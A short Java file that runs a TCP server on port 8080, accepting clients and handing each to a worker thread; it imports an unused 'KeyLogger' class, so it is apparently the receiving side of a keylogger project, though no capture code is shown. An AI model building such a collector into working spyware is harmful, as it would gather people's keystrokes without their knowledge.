package Function;

import java.net.ServerSocket;
import java.net.Socket;

import KeyLogger.KeyLogger;

public class Connection {
	private static ServerSocket server = null;
	private static int port = 8080;
	private static final int LINGER_TIME = 5000;	
	public static void main(String[] arg) {
		try {
			System.out.println("Watting");
			server = new ServerSocket(port);
			
			while (server.isBound() && server != null) {
				Socket clientSocket = server.accept();
				clientSocket.setSoLinger(true, LINGER_TIME);
				
				System.out.println("connected by " + clientSocket.getInetAddress());
				WorkerThread woker = new WorkerThread(clientSocket);
				woker.start();
			}
		} catch (Exception e) {
			e.getStackTrace();
		} finally {
			try {
				if(server != null) {
					server.close();
				}
			} catch (Exception e2) {
				e2.getStackTrace();
			}
		}
	}
}
